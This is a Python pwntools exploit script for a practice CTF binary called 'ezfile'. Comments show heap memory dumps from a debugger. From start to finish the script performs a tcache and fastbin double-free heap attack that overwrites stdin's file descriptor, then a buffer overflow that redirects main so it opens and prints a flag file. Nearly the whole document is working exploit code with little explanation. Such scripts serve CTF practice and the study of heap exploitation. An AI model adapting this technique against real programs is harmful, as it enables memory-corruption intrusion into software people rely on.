#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

'''
You need to disable ASLR first !~
Because this exploit is for practice

ref:
    http://blog2.eonew.cn/archives/20
'''

r = process('./ezfile')

def cmd(x):
    r.recvuntil('>>')
    r.sendline(str(x))

def add(l,s):
    cmd(1)
    r.recvuntil('>>')
    r.sendline(str(int(l)))
    r.recvuntil('>>')
    r.send(s)

def delete(i):
    cmd(2)
    r.recvuntil('>>')
    r.sendline(str(int(i)))

def encrypt(i,l,c):
    cmd(3)
    r.recvuntil('>>')
    r.sendline(str(int(i)))
    r.recvuntil('>>')
    r.sendline(str(int(l)))
    r.recvuntil('>>')
    raw_input('#')
    r.sendline(str(c))

r.recvuntil('name: ')
r.send('a'*90)

add(0x10, p64(0) + p64(0x21)) # 0
add(0x18, '\n') # 1
add(0x18, '\n') # 2
add(0x18, '\n') # 3
add(0x18, '\n') # 4
add(0x18, '\n') # 5
add(0x18, '\n') # 6

for i in range(7):
    delete(0)


'''
0x555555757560: 0x0000000000000000      0x0000000000000021   
0x555555757570: 0x0000555555757570      0x0000000000000000   
0x555555757580: 0x0000000000000000      0x0000000000000021    
'''
delete(1)

'''
0x555555757560: 0x0000000000000000      0x0000000000000021   
0x555555757570: 0x0000555555757580      0x0000000000000000   
0x555555757580: 0x0000000000000000      0x0000000000000021    
'''
add(0x1, p8(0x80))

'''
tcachebins
0x20 [  5]: 0x555555750a80
'''
add(0x1, p8(0x90))

'''
0x555555757560: 0x0000000000000000      0x0000000000000021
0x555555757570: 0x0000555555757590      0x0000000000000000
0x555555757580: 0x0000000000000000      0x00000000000000a1
0x555555757590: 0x0000000000000000      0x0000000000000000
'''
add(0x10, p64(0) + p64(0xa1))


'''
0x555555757560: 0x0000000000000000      0x0000000000000021
0x555555757570: 0x0000555555757590      0x0000000000000000
0x555555757580: 0x0000000000000000      0x00000000000000a1
0x555555757590: 0x00007ffff7dcfca0      0x00007ffff7dcfca0
'''
for i in range(8):
    delete(1)

'''
0x555555757600: 0x0000000000000000      0x0000000000000021
0x555555757610: 0x000000000000000a      0x0000000000000000
0x555555757620: 0x00000000000000a0      0x0000000000000020
'''
delete(9)

'''
stdin->fileno : 0x7ffff7dcfa70 (No ASLR)
fastbin double free attack
'''
add(0x12, p64(0) + p64(0x21) + '\x60\xfa')
add(0x18, '\n')

'''
0x7ffff7dcfa70 <_IO_2_1_stdin_+112>:    0x0000000000000003
'''
add(0x1, p8(3)) # hijack


'''
BufferOverFlow
0x55555555514c <main+103>           call   open@plt <0x555555554930>
    file: 0x7fffffffde50 ◂— 0x67616c66 /* 'flag' */
    oflag: 0x0
    vararg: 0x0

0x5555555551a8 <main+195>    call   printf@plt <0x5555555548b0>
    format: 0x5555555554ec ◂— 'welcome!%s.\n'
    vararg: 0x555555756120 (name) ◂— 'Flag{TEst_fl1g_Good_W0rk}'
'''
payload = 'flag\x00'.ljust(0x68, '\x00') + '\x4c\x51'

encrypt(0, len(payload), payload)


r.interactive()
